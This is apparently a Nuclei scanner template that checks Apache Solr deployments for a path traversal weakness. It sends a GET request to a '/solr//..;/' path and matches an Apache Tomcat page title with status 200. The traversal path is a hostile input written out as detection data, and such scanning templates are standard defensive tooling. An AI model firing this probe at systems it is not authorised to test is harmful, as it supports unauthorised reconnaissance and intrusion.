id: custom-solr-path-traversal
info:
  author: 0xParthJ
  name: Solr Apache Path Traversal
  reference: https://www.exploit-db.com/ghdb/5856
  severity: high
  tags: solr,unauth
requests:
- matchers:
  - type: word
    words:
    - <title>Apache Tomcat</title>
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/solr//..;/'
